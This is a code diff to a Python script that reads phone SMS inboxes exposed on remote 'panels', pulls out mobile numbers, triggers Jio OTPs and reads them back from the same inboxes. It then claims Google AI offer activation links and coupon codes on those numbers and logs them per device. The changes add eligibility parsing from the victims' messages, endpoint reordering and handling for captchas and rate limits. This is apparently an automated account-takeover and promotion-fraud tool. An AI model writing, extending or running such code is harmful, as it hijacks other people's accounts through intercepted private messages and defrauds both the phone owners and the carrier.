@@ -83,9 +83,9 @@ ACTIVATE_URL = f"{JIO_BASE}/jio-ott-service/ott/subscription/activate/Z0241?sour
 # fallbacks last) because Jio reshuffles them between releases. The first entry is
 # what the WAP offer page itself calls.
 ACTIVATE_ATTEMPTS = (
+    f"{JIO_BASE}/jio-ott-service/ott/subscription/google-lead",
     f"{JIO_BASE}/jio-ott-service/ott/subscription/activate/googleai",
     GOOGLE_URL,
-    f"{JIO_BASE}/jio-ott-service/ott/subscription/google-lead",
     ACTIVATE_URL,
 )
 # One of these has to be hit for Jio to mark the offer consumed; the second is the
@@ -115,6 +115,23 @@ CONTEXT_PATTERNS = (
     (re.compile(r"(?i)नंबर\s*[:=-]?\s*([6-9]\d{9})"), 60),
 )
 RAW_NUMBER_RE = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
+
+# Eligibility hint from the panel's own SMS. A qualifying active recharge (₹349+) is
+# one of the offer's conditions, and a plan that lapsed is not eligible.
+PLAN_EXPIRED_RE = re.compile(
+    r"(?i)(expired|has expired|is expired|expired on|recharge\s+immediately"
+    r"|plan\s+expired)"
+    r"|समाप्त"
+)
+PLAN_EXPIRING_RE = re.compile(
+    r"(?i)(expiring|expires? (?:on|today|tomorrow)|समाप्त होने)")
+PLAN_ACTIVE_RE = re.compile(
+    r"(?i)(successfully recharged|recharge (?:of|successful)|plan activated|"
+    r"valid till|data balance|complimentary .*active)"
+    r"|रिचार्ज\s*(?:सफळ|सफल)"
+    r"|રિચાર્જ\s*સફળ"
+)
+QUALIFYING_PLAN_RE = re.compile(r"(?:349|399|449|549|649|749|799|849|859|899|2999|3599)")
 
 OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification code")
 OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")
@@ -156,7 +173,7 @@ MIN_NUMBER_SCORE = 2
 
 RESULT_FIELDS = (
     "serial_number", "panel_schema", "panel", "device_id", "mobile_number",
-    "status", "activation_url", "coupon_code", "nepal_date", "nepal_time",
+    "status", "plan_hint", "activation_url", "coupon_code", "nepal_date", "nepal_time",
 )
 
 _LOCK = threading.Lock()
@@ -379,6 +396,44 @@ def number_scores(items: list[tuple[str, dict[str, Any]]]) -> list[tuple[str, in
                 for value in seen_here:
                     scores[value] += bonus
     return sorted(scores.items(), key=lambda pair: (-pair[1], pair[0]))
+
+
+def plan_state(items: list[tuple[str, dict[str, Any]]], mobile: str,
+               allow_unattributed: bool = False) -> str:
+    """Eligibility hint from the newest plan-related SMS: active | expiring | expired | unknown.
+
+    The newest message wins, because panels replay history: an "expiring tomorrow"
+    notice followed by a "recharge successful" SMS means the plan is now good.
+
+    Messages are attributed to `mobile`. On single-candidate panels the phone's own
+    inbox is nearly always about one SIM, so `allow_unattributed` lets plan language
+    count even when the SMS omits the number.
+    """
+    now = time.time() * 1000
+    newest_stamp = 0.0
+    verdict = "unknown"
+    for keypath, item in items:
+        body = message_body(item)
+        if not body:
+            continue
+        stamp = message_time(keypath, item)
+        if stamp < now - 30 * 86400_000:
+            continue
+        attributed = mobile in re.sub(r"\D", "", body)
+        if not attributed and not allow_unattributed:
+            continue
+        if PLAN_EXPIRED_RE.search(body):
+            candidate = "expired"
+        elif PLAN_EXPIRING_RE.search(body):
+            candidate = "expiring"
+        elif PLAN_ACTIVE_RE.search(body):
+            candidate = "active"
+        else:
+            continue
+        if stamp >= newest_stamp:
+            newest_stamp = stamp
+            verdict = candidate
+    return verdict
 
 
 def panel_own_numbers(session: requests.Session, panel: dict[str, Any]) -> list[str]:
@@ -643,6 +698,8 @@ def claim_activation(session: requests.Session) -> tuple[str, str, str]:
         return "api_session_invalid", "", ""
 
     last = "activation_api_failed"
+    lead_ok = False
+    unauthorized = False
     for url in ACTIVATE_ATTEMPTS:
         for method in (session.get, session.post):
             try:
@@ -668,11 +725,18 @@ def claim_activation(session: requests.Session) -> tuple[str, str, str]:
                     except requests.RequestException:
                         continue
                 return "activation_url_found", url_found, coupon_code(raw)
-            if response.status_code not in (200, 201):
-                last = f"activation_api_failed"
-            else:
-                last = "no_activation_url"
+            if "google-lead" in url and response.status_code == 200:
+                lead_ok = True
+            if response.status_code == 401:
+                unauthorized = True
+            last = ("activation_api_failed"
+                    if response.status_code not in (200, 201) else "no_activation_url")
         time.sleep(0.5)
+
+    # Lead generated and submission accepted, but the endpoint that hands over the
+    # link refuses the session: that is Jio's entitlement gate, not our auth.
+    if lead_ok and unauthorized:
+        return "google_ai_unauthorized", "", ""
     return last, "", ""
 
 
@@ -717,7 +781,7 @@ class Output:
             return True
 
     def result(self, serial: int, record: dict[str, Any], mobile: str,
-               status: str, url: str, coupon: str = "") -> None:
+               status: str, url: str, coupon: str = "", plan: str = "") -> None:
         date, clock = nepal_now()
         with self.lock:
             exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
@@ -732,6 +796,7 @@ class Output:
                     "device_id": record["device_id"],
                     "mobile_number": mobile,
                     "status": status,
+                    "plan_hint": plan,
                     "activation_url": url,
                     "coupon_code": coupon,
                     "nepal_date": date,
@@ -766,6 +831,7 @@ def scan_panel(session: requests.Session, panel: dict[str, Any],
                 continue
             devices.append({"panel": panel, "device_id": device_id, "node": node,
                             "newest": newest, "known": {k for k, _ in items},
+                            "items": items,
                             "candidates": candidates[:MAX_CANDIDATES], "record": record})
         if devices and ADD_OWN_NUMBER:
             own = panel_own_numbers(session, panel)
@@ -790,6 +856,7 @@ def scan_panel(session: requests.Session, panel: dict[str, Any],
                 continue
             devices.append({"panel": panel, "device_id": device_id, "node": node,
                             "newest": newest, "known": {k for k, _ in items},
+                            "items": items,
                             "candidates": candidates[:MAX_CANDIDATES], "record": {}})
         if devices:
             break
@@ -866,23 +933,28 @@ def process_device(device: dict[str, Any], state: dict[str, Any], args: argparse
         print(f"\n[{state['serial']}] {mobile} ({mobile[-4:]})"
               f" <- {device['device_id'][:10]} [{device['panel']['schema']}]")
 
+        plan = plan_state(device["items"], mobile,
+                          allow_unattributed=len(device["candidates"]) == 1)
+        if plan != "unknown":
+            print(f"  plan hint: {plan}")
+
         state_ok = check_number(jio, mobile)
         if state_ok == "captcha" and wait_out_captcha(jio, mobile, args.captcha_wait):
             state_ok = check_number(jio, mobile)
         if state_ok == "captcha":
             statuses["captcha_required"] += 1
-            output.result(state["serial"], device, mobile, "captcha_required", "")
+            output.result(state["serial"], device, mobile, "captcha_required", "", plan=plan)
             print("Status: captcha_required")
             return "captcha_required", "", ""
         if state_ok == "not_jio":
             statuses["not_jio_number"] += 1
             output.add_number(mobile)
-            output.result(state["serial"], device, mobile, "not_jio_number", "")
+            output.result(state["serial"], device, mobile, "not_jio_number", "", plan=plan)
             print("Status: not_jio_number")
             continue
         if state_ok == "error":
             statuses["check_failed"] += 1
-            output.result(state["serial"], device, mobile, "check_failed", "")
+            output.result(state["serial"], device, mobile, "check_failed", "", plan=plan)
             print("Status: check_failed")
             continue
 
@@ -891,24 +963,24 @@ def process_device(device: dict[str, Any], state: dict[str, Any], args: argparse
             blocked[mobile] = time.time() + LOCK_BLOCK
             statuses["otp_locked"] += 1
             output.add_number(mobile)
-            output.result(state["serial"], device, mobile, "otp_locked", "")
+            output.result(state["serial"], device, mobile, "otp_locked", "", plan=plan)
             print("Status: otp_locked")
             continue
         if sent == "rate":
             statuses["rate_limited"] += 1
-            output.result(state["serial"], device, mobile, "rate_limited", "")
+            output.result(state["serial"], device, mobile, "rate_limited", "", plan=plan)
             print("Status: rate_limited")
             wait_out_captcha(jio, mobile, args.captcha_wait)
             continue
         if sent == "invalid":
             statuses["not_jio_number"] += 1
             output.add_number(mobile)
-            output.result(state["serial"], device, mobile, "not_jio_number", "")
+            output.result(state["serial"], device, mobile, "not_jio_number", "", plan=plan)
             print("Status: not_jio_number")
             continue
         if sent != "ok":
             statuses["otp_send_failed"] += 1
-            output.result(state["serial"], device, mobile, "otp_send_failed", "")
+            output.result(state["serial"], device, mobile, "otp_send_failed", "", plan=plan)
             print(f"Status: otp_send_failed ({sent})")
             continue
 
@@ -920,16 +992,16 @@ def process_device(device: dict[str, Any], state: dict[str, Any], args: argparse
         )
         if not otp:
             statuses["otp_failed"] += 1
-            output.result(state["serial"], device, mobile, "otp_failed", "")
+            output.result(state["serial"], device, mobile, "otp_failed", "", plan=plan)
             print("Status: otp_failed")
             continue
 
         status, url, coupon = claim_activation(jio)
-        if status == "already_active":
+        if status in ("already_active", "google_ai_unauthorized"):
             blocked[mobile] = time.time() + LOCK_BLOCK
         statuses[status] += 1
         output.add_number(mobile)
-        output.result(state["serial"], device, mobile, status, url, coupon)
+        output.result(state["serial"], device, mobile, status, url, coupon, plan)
         print(f"Status: {status}")
         if coupon:
             print(f"COUPON -> {coupon}")
